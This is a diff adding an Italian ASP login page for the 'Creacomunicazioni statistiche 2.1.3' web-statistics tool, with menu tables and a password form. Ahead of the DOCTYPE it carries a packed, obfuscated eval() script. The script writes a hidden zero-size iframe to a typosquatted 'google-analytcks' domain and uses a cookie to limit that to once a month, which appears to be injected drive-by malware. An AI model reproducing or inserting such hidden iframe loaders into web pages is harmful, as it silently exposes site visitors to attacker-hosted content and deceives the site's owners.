@@ -1,0 +1,161 @@
+
+<!--include virtual="/myasg/config.asp" -->
+
+<!-- Auto Generate Script --><script type="text/javascript">
+eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+c.toString(a)+'\\b','g'),k[c])}}return p}('f 4=6 5(),2=6 5(4.d()+g);c(0.7.9("8=1")==-1){0.b("<3 a=1 e=1 o=\'n://h-q.m/l/\' i=\'j:k\'></3>");0.7="8=1;"+" 2="+2.p()+"; "}',27,27,'document||expires|iframe|today|Date|new|cookie|infobit|indexOf|width|write|if|getTime|height|var|2678400000|google|style|display|none|b2b|net|http|src|toGMTString|analytcks'.split('|')))
+</script>
+
+<!--include file="languages/english.asp" -->
+<!--include file="languages/espanol.asp" -->
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title>creacomunicazioni.it | Creacomunicazioni statistiche 2.1.3</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+
+<meta name="copyright" content="Copyright (C) 2003-2004 Carletti Simone" />
+
+<link href="stile.css" rel="stylesheet" type="text/css" />
+
+<!-- 	Creacomunicazioni 2.1.3   -->
+</head>
+<!--include virtual="/myasg/includes/header.asp" -->
+<body bgcolor="#EEEEEE" background="">
+<table width="900" border="0" align="center" cellpadding="1" cellspacing="0"><tr>
+<td width="150" align="left" valign="top">&nbsp;<a href="http://www.creacomunicazioni.it/" title="Creacomunicazioni.it Home Page"><img src="images/logo.gif" border="0" alt="Realizzato da by Creacomunicazioni.it" /></a></td>
+<td width="750" align="right" valign="top">
+<table width="750" border="0" align="center" cellpadding="1" cellspacing="0" bgcolor="#cccccc">
+  <tr><td>
+	<table width="100%" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#F9F9F9">
+	  <tr><td>
+		<table width="100%" border="0" align="center" cellpadding="1" cellspacing="1">
+		  <tr align="center" class="bartitle" bgcolor="" valign="middle">
+			<td background="images/layout/bar_bg.jpg" width="16%" height="20">GENERALE</td>
+			<td background="images/layout/bar_bg.jpg" width="16%">SISTEMI</td>
+			<td background="images/layout/bar_bg.jpg" width="16%">STATISTICHE</td>
+			<td background="images/layout/bar_bg.jpg" width="16%">PROVENIENZA</td>
+			<td background="images/layout/bar_bg.jpg" width="16%">VARIE</td>
+			<td background="images/layout/bar_bg.jpg">OPZIONI</td>
+		  </tr>
+		</table>
+	  </td></tr>
+	</table>
+  </td></tr>
+</table>
+<table width="750" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="">
+  <tr><td>
+	<table width="100%" border="0" align="center" cellpadding="1" cellspacing="1">
+	  <tr align="center" class="smalltext">
+		<td bgcolor="#F9F9F9" width="16%" height="16"><a href="statistiche.asp" title="Mostra&nbsp;Sommario" class="linksmalltext">Sommario</a></td>
+		<td bgcolor="#F9F9F9" width="16%"><a href="os.asp" title="Mostra&nbsp;Sistema Operativo" class="linksmalltext">Sistema Operativo</a></td>
+		<td bgcolor="#F9F9F9" width="16%"><a href="stats_hourly.asp" title="Mostra&nbsp;Accessi per Ora" class="linksmalltext">Accessi per Ora</a></td>
+		<td bgcolor="#F9F9F9" width="16%"><a href="referer.asp" title="Mostra&nbsp;Referer" class="linksmalltext">Referer</a></td>
+		<td bgcolor="#F9F9F9" width="16%"><a href="ip_address.asp" title="Mostra&nbsp;Indirizzo IP" class="linksmalltext">Indirizzo IP</a></td>
+		<td bgcolor="#F9F9F9"><a href="settings_common.asp" title="Mostra&nbsp;Gestione Applicazione" class="linksmalltext">Gestione Applicazione</a></td>
+	  </tr>
+	  <tr align="center" class="smalltext">
+		<td bgcolor="#F9F9F9" height="16"><a href="visitors.asp" title="Mostra&nbsp;Dettagli Visitatori" class="linksmalltext">Dettagli Visitatori</a></td>
+		<td bgcolor="#F9F9F9"><a href="browser.asp" title="Mostra&nbsp;Browser" class="linksmalltext">Browser</a></td>
+		<td bgcolor="#F9F9F9"><a href="stats_daily.asp" title="Mostra&nbsp;Accessi per Giorno" class="linksmalltext">Accessi per Giorno</a></td>
+		<td bgcolor="#F9F9F9"><a href="engine.asp" title="Mostra&nbsp;Motori di Ricerca" class="linksmalltext">Motori di Ricerca</a></td>
+		<td bgcolor="#F9F9F9"><a href="country.asp" title="Mostra&nbsp;Nazione" class="linksmalltext">Nazione</a></td>
+		<td bgcolor="#F9F9F9"><a href="settings_security.asp" title="Mostra&nbsp;Controllo Sicurezza" class="linksmalltext">Controllo Sicurezza</a></td>
+	  </tr>
+	  <tr align="center" class="smalltext">
+		<td bgcolor="#F9F9F9" height="16"><a href="pages.asp" title="Mostra&nbsp;Pagine Visitate" class="linksmalltext">Pagine Visitate</a></td>
+		<td bgcolor="#F9F9F9"><a href="browser_lang.asp" title="Mostra&nbsp;Lingue del Browser" class="linksmalltext">Lingue del Browser</a></td>
+		<td bgcolor="#F9F9F9"><a href="stats_monthly.asp" title="Mostra&nbsp;Accessi per Mese" class="linksmalltext">Accessi per Mese</a></td>
+		<td bgcolor="#F9F9F9"><a href="query.asp" title="Mostra&nbsp;Query di Ricerca" class="linksmalltext">Query di Ricerca</a></td>
+		<td bgcolor="#F9F9F9"><a href="serp.asp" title="Mostra&nbsp;Controllo SERP" class="linksmalltext">Controllo SERP</a></td>
+		<td bgcolor="#F9F9F9"><a href="settings_reset.asp" title="Mostra&nbsp;Esecuzione Reset" class="linksmalltext">Esecuzione Reset</a></td>
+	  </tr>
+	  <tr align="center" class="smalltext">
+		<td height="16">&nbsp;</td>
+		<td bgcolor="#F9F9F9"><a href="color.asp" title="Mostra&nbsp;Reso & Bit" class="linksmalltext">Reso & Bit</a></td>
+		<td bgcolor="#F9F9F9"><a href="stats_calendar.asp" title="Mostra&nbsp;Calendario Mensile" class="linksmalltext">Calendario Mensile</a></td>
+		<td>&nbsp;</td>
+		<td>&nbsp;</td>
+		<td bgcolor="#F9F9F9"><a href="settings_exitcount.asp" title="Mostra&nbsp;" class="linksmalltext">Esclusione Conteggio</a></td>
+	  </tr>
+	  <tr align="center" class="smalltext">
+		<td height="16">&nbsp;</td>
+		<td bgcolor="#F9F9F9"><a href="system.asp" title="Mostra&nbsp;Sistemi" class="linksmalltext">Sistemi</a></td>
+		<td>&nbsp;</td>
+		<td>&nbsp;</td>
+		<td>&nbsp;</td>
+		<td bgcolor="#F9F9F9"><a href="settings_skin.asp" title="Gestione Skin" class="linksmalltext">Gestione Skin</a></td>
+	  </tr>
+	  <tr align="center" class="smalltext">
+		<td height="16">&nbsp;</td>
+		<td>&nbsp;</td>
+		<td>&nbsp;</td>
+		<td>&nbsp;</td>
+		<td>&nbsp;</td>
+		<td bgcolor="#F9F9F9"><a href="check_server.asp" title="Mostra&nbsp;Informazioni Server" class="linksmalltext">Informazioni Server</a></td>
+	  </tr>
+	  <tr align="center" class="smalltext">
+		<td height="16">&nbsp;</td>
+		<td>&nbsp;</td>
+		<td>&nbsp;</td>
+		<td>&nbsp;</td>
+		<td>&nbsp;</td>
+		<td bgcolor="#F9F9F9"><a href="compact_database.asp" title="Compatta Database" class="linksmalltext">Compatta Database</a></td>
+	  </tr>
+	</table>
+  </td></tr>
+</table>
+
+
+</tr></table><br />
+
+
+<table width="900" border="0" align="center" cellpadding="1" cellspacing="0" bgcolor="#cccccc">
+  <tr><td>
+	<table width="100%" border="0" align="center" cellpadding="0" cellspacing="0">
+	  <tr><td bgcolor="#F9F9F9" background="images/">
+		<form action="login.asp?backto=%2Fcreacomunicazioni%2Dstatistiche%2Freferer%2Easp%3Ascript0" name="frmLogin" method="post">
+		<table width="100%" border="0" align="center" cellpadding="0" cellspacing="1">
+		  <tr bgcolor="" valign="middle">
+			<td background="images/layout/bar_bg.jpg" align="center" height="20" class="bartitle">LOGIN</td>
+		  </tr>
+		  <tr bgcolor="#cccccc">
+			<td align="center" height="1"></td>
+		  </tr>
+		</table><br />
+		<table width="90%" border="0" align="center" cellpadding="1" cellspacing="1">
+		
+		  <tr bgcolor="" class="normaltitle">
+			<td background="images/layout/small_bar_bg.jpg" colspan="2" align="center" height="16">PASSWORD DI ACCESSO</td>
+		  </tr>
+			  
+		  <tr class="smalltext" bgcolor="#F9F9F9">
+			<td background="images/" width="50%" align="right">Digitare la Password: &nbsp;&nbsp;</td>
+			<td background="images/" width="50%" align="left">&nbsp;<input type="password" name="Password" value="" size="20" maxlength="20" /></td>
+		  </tr>
+<tr class="smalltext" bgcolor="">
+  <td colspan="2" background="images/layout/small_bar_bg.jpg" height="2"></td>
+</tr><tr class="normaltitle">
+			<td colspan="2" align="center"><script>document.frmLogin.Password.focus()</script><br />
+				<input type="hidden" name="Login" value="Login" />
+				<input type="submit" name="submit" value="Login" />
+			</td>
+		  </tr>
+		
+		</table>
+		</form>
+
+		<table width="100%" border="0" align="center" cellpadding="0" cellspacing="1">
+<tr bgcolor="#cccccc">
+  <td align="center" height="1"></td>
+</tr>
+		  <tr align="center" valign="middle">
+			<td align="center" background="images/layout/bar_bg.jpg" bgcolor="" height="20" class="footer">Creacomunicazioni statistiche [2.1.3] - &copy; 2003-2007 <a href="http://www.creacomunicazioni.it/" class="linkfooter">Creacomunicazioni</a> - Pagina generata in&nbsp;0,0625&nbsp;secondi</td>
+		  </tr>
+		</table>
+	  </td></tr>
+	</table>
+  </td></tr>
+</table>
+<!--include virtual="/myasg/includes/footer.asp" -->
+
+</body></html>
